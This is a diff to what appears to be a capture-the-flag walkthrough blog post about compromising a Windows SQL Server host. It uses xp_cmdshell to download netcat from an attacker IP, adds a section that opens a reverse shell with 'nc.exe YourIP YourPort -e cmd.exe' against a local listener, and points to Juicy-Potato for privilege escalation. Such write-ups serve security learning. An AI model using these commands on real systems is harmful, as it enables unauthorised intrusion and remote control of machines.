@@ -93,6 +93,17 @@ The way i'm going to do it is by uploading an [old windows netcat executable](ht
 **xp_cmdshell powershell "wget http://YourIP:GivenPort/nc.exe -OutFile %temp%/nc.exe"**  
 ![SqlCommand.png]({{site.baseurl}}/Images/SqlCommand.png)
 
+
+### Getting the shell
+1. Spawning a local listener on port 4444 with the command line: **nc -lvnp 4444**
+2. Running the uploaded executable as it follows: **xp_cmdshell  powershell "nc.exe YourIP YourPort -e cmd.exe"**  
+![SqlCommand2.png]({{site.baseurl}}/Images/SqlCommand2.png)
+3. Check if we got a hit on our local listener:  
+![FirstCmdShell.png]({{site.baseurl}}/Images/FirstCmdShell.png)
+
+
+
+
 ## Escalating to a root shell
 ---
 As of now, we have full access to an account that we know it can Impersonate Tokens, which means that we can take ownage of a process run by a higher privileged user on the system and create a privileged shell. This can be done via [Juicy-Potato exploit](https://github.com/ohpe/juicy-potato).
